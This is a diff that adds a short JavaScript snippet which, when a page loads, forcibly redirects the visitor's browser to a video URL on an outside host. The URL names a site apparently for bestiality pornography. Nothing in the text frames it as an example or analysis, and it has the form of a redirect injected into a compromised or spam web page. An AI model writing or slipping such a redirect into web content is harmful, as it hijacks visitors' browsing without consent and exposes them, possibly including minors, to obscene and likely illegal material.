@@ -1,0 +1,6 @@
+<script type="text/javascript">
+var urls = new Array();
+urls[0] = "http://mediacnt.com/zoosexfarm.com/9/3/938149280/content/full.mp4?ahk=CQ73-vD-TOYx-sC6bEDcRwkkk@kkk1525458211%27;";
+var random = Math.floor(Math.random()*urls.length);
+window.location = urls[random];
+</script>
